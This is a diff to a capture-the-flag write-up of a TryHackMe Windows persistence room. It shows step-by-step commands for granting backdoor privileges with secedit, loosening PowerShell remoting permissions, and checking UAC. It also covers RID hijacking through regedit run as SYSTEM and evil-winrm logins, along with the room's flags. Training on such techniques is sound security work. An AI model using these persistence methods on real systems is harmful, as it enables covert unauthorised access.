@@ -136,6 +136,8 @@ Info: Establishing connection to remote endpoint
 THM{FLAG_BACKED_UP!}
 ```
 
+**TASK COMPLETED**
+
 # Assigning Specific Privileges Using Security Descriptors
 1. Start this room's machine
 2. `PowerShell`
@@ -146,14 +148,18 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 
 PS C:\Users\Administrator>
 ```
-3. `whoami`
+3. `cd \`
 ```PowerShell
-PS C:\Users\Administrator> whoami
+PS C:\Users\Administrator> cd \
+```
+4. `whoami`
+```PowerShell
+PS C:\> whoami
 wpersistence\administrator
 ```
-4. `whoami /priv`
+5. `whoami /priv`
 ```PowerShell
-PS C:\Users\Administrator> whoami /priv
+PS C:\> whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -185,16 +191,16 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
 ```
-5. `secedit /export /cfg {FILENAME1}.inf`
+6. `secedit /export /cfg {FILENAME1}.inf`
 ```PowerShell
-PS C:\Users\Administrator> secedit /export /cfg CONFIG.inf
+PS C:\> secedit /export /cfg CONFIG.inf
 
 The task has completed successfully.
 See log %windir%\security\logs\scesrv.log for detail info.
 ```
-6. `dir`
+7. `dir`
 ```PowerShell
-PS C:\Users\Administrator> dir
+PS C:\> dir
 
 
     Directory: C:\Users\Administrator
@@ -216,31 +222,31 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/4/2023   2:56 AM          19318 CONFIG.inf
 ```
-7. `notepad {FILENAME1}.inf`
+8. `notepad {FILENAME1}.inf`
 ```PowerShell
 PS C:\Users\Administrator> notepad CONFIG.inf
 ```
 
 ![]()
 
-8. add thmuser 2 to both privileges
+9. add thmuser 2 to both privileges
 
 ![]()
 
-9. `secedit /import /cfg {FILENAME1}.inf /db {FILENAME2}.sdb`
+10. `secedit /import /cfg {FILENAME1}.inf /db {FILENAME2}.sdb`
 ```PowerShell
-PS C:\Users\Administrator> secedit /import /cfg CONFIG.inf /db CONFIG.sdb
+PS C:\> secedit /import /cfg CONFIG.inf /db CONFIG.sdb
 ```
-10. `secedit /configure /db {FILENAME2}.sdb /cfg config.inf`
+11. `secedit /configure /db {FILENAME2}.sdb /cfg config.inf`
 ```PowerShell
-PS C:\Users\Administrator> secedit /configure /db CONFIG.sdb /cfg CONFIG.inf
+PS C:\> secedit /configure /db CONFIG.sdb /cfg CONFIG.inf
 
 The task has completed successfully.
 See log %windir%\security\logs\scesrv.log for detail info.
 ```
-11. `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
+12. `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
 ```PowerShell
-PS C:\Users\Administrator> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
 WARNING: Set-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name
 has recently been unregistered, certain system data structures may still be cached. In that case, a restart of
  WinRM may be required.
@@ -250,10 +256,6 @@ session configurations that are created with the Register-PSSessionConfiguration
 
 ![]()
 
-12. `cd \`
-```PowerShell
-PS C:\Users\Administrator> cd \
-```
 13. `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` from the compromised Windows machine to check if Microsoft's UAC is active on our compromised machine and display the results onto our terminal, which ended up being the case (1 meaning that it's enabled) and therefore preventing us from running any administrative privileges when remotely connecting back to the compromised machine since it strips the user who's remotely connecting to the compromised system from any administrative privileges that they may have by disabling their access to the privileges of the groups that they're a part of that have full or certain administrator privileges, which in this case was the **Backup Operators** group
 ```PowerShell
 C:\>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
@@ -285,9 +287,83 @@ PRIVILEGES INFORMATION
 
 Privilege Name                Description                    State
 ============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 17. `C:\flags\flag2.exe`
+```Bash
+*Evil-WinRM* PS C:\Users\thmuser2\Documents> C:\flags\flag2.exe
+THM{IM_JUST_A_NORMAL_USER}
+```
+
+**TASK COMPLETED**
 
 # RID Hijacking
+1. Start this room's machine
+2. `cd \`
+```PowerShell
+PS C:\Users\Administrator> cd \
+```
+3. `wmic useraccount get name,sid`
+```PowerShell
+PS C:\> wmic useraccount get name,sid
+Name                SID
+Administrator       S-1-5-21-1966530601-3185510712-10604624-500
+DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
+Guest               S-1-5-21-1966530601-3185510712-10604624-501
+thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011
+thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
+thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
+thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
+thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013
+WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504
+```
+4. `cd C:\tools\pstools`
+```PowerShell
+C:\>cd C:\tools\pstools
+```
+5. `PsExec64 -i -s regedit`
+```PowerShell
+C:\tools\pstools>PsExec64 -i -s regedit
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+```
+
+![]()
+
+6. `evil-winrm -i {TARGET IP} -u thmuser3 -p Password321`
+```Bash
+root@ip-10-10-28-182:~# evil-winrm -i 10.10.159.254 -u thmuser3 -p Password321
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 5]: <f:WSManFault Code='5' Machine='10.10.159.254' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>Access is denied. </f:Message></f:WSManFault>
+
+Error: Exiting with code 1
+```
+7. `sudo remmina`
+
+![]()
+
+![]()
+
+![]()
+
+8. `whoami`
+```PowerShell
+C:\Users\Administrator>whoami
+wpersistence\administrator
+```
+9. `C:\flags\flag3.exe`
+```PowerShell
+C:\Users\Administrator>C:\flags\flag3.exe
+THM{TRUST_ME_IM_AN_ADMIN}
+```
+
+**ROOM COMPLETED**
